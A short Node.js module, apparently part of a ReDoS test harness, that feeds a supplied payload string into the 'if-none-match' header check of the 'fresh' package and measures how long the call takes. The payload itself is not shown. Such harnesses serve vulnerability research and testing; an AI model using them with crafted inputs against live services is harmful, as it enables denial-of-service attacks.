const measureTime = require("../utils").measureTime;

function exploitFunction(payload) {
  const genstr = require("../utils").genstr;
  const fresh = require("fresh");

  let str = payload.str;
  let t = measureTime(() => {
    fresh({ "if-none-match": str }, { etag: 23 });
  });

  let time = t[0] + t[1] / 1000000000;
  return time;
}

module.exports = { exploitFunction };